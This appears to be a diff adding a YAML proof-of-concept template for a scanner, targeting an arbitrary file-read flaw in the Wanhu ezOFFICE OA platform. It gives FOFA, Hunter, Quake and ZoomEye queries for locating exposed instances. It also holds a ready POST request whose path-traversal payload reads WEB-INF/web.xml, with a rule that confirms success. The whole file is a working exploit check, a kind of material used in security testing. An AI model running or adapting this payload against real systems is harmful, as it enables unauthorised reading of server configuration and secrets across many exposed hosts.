@@ -1,0 +1,36 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="万户网络-ezOFFICE"
+    hunter-query: app.name="万户 Ezoffice OA"
+    quake-query: app:"万户ezOFFICE协同管理平台"
+    zoomeye-query: title:"万户ezOFFICE协同管理平台"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips:
+    
+name: poc-yaml-wanhu-ezoffice-text2Html.controller-file-read
+manual: true
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+    t1: timeConvert(now(), '2006-01-02')
+rules:
+    r0:
+        request:
+            cache: true
+            method: POST
+            path: /defaultroot/convertFile/text2Html.controller
+            headers:
+              Content-Type: application/x-www-form-urlencoded
+            body: saveFileName=test/../../../../WEB-INF/web.xml&moduleName=text          
+        expression: response.status == 200 && response.body_string.contains("web-app")  && response.raw_header.bcontains(b"text/html")
+
+expression: r0() 
